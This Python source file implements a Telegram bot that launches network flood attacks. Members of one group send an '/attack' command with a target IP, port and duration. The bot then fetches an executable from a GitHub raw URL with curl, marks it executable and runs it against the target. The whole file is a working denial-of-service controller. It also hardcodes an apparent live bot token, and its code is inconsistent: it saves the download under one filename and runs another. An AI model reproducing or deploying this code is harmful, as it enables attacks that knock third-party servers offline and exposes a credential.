import os
import sys
import telebot
import logging
import time
import asyncio
from threading import Thread

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '7358727224:AAFPGDgKNh-sLrbspUUj5APvePlQTf9Y3ZI'  # Replace with your actual bot token
bot = telebot.TeleBot(TOKEN)  # Initialize the bot

DESIGNATED_GROUP_ID = -1002271966296

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
attack_in_progress = False
MAX_DURATION = 400  # Maximum allowed duration

# URL to the danger file in the specified repo
DANGER_FILE_URL = "https://raw.githubusercontent.com/Gamewallah63/pubg/main/danger"
TEMP_FILE_PATH = "temp_danger"

async def download_danger_file():
    # Download the danger file temporarily
    download_command = f"curl -sSL {DANGER_FILE_URL} -o {TEMP_FILE_PATH}"
    os.system(download_command)  # Execute the download command

async def run_attack(target_ip, target_port, duration):
    global attack_in_progress
    attack_in_progress = True  # Set the attack in progress flag

    await download_danger_file()

    # Make the new file executable
    os.chmod(TEMP_FILE_PATH, 0o755)

    # Execute the binary with `./soulcracks`, setting the thread count to 10
    command = f"./soulcracks {target_ip} {target_port} {duration} 10"
    process = await asyncio.create_subprocess_shell(
        command,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    running_processes.append(process)
    stdout, stderr = await process.communicate()

    output = stdout.decode(errors='replace')
    error = stderr.decode(errors='replace')

    if output:
        logging.info(f"Command output: {output}")
    if error:
        logging.error(f"Command error: {error}")

    attack_in_progress = False  # Reset the flag after execution

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    try:
        await run_attack(target_ip, target_port, duration)
        bot.send_message(chat_id, "*Attack command executed successfully.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error during attack execution: {e}")
        bot.send_message(chat_id, "*An error occurred while executing the attack.*", parse_mode='Markdown')

def is_in_designated_group(chat_id):
    return chat_id == DESIGNATED_GROUP_ID

@bot.message_handler(func=lambda message: is_in_designated_group(message.chat.id))
def handle_commands(message):
    if message.text.startswith('/attack'):
        attack_command(message)

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_in_designated_group(chat_id):
        bot.send_message(chat_id, "*This bot can only be used in the designated group.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.send_message(chat_id, "*ATTACK IS ALREADY ONGOING. WAIT FOR FURTHER ATTACK.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()[1:]  # Get the args from the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: /attack <target_ip> <target_port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if duration > MAX_DURATION:
            bot.send_message(chat_id, "*Error: Time limit is 240 seconds.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"*Attack started ⚡\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*Failed to process the attack command.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

if __name__ == "__main__":
    loop = asyncio.get_event_loop()  # Initialize the asyncio event loop
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")

        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
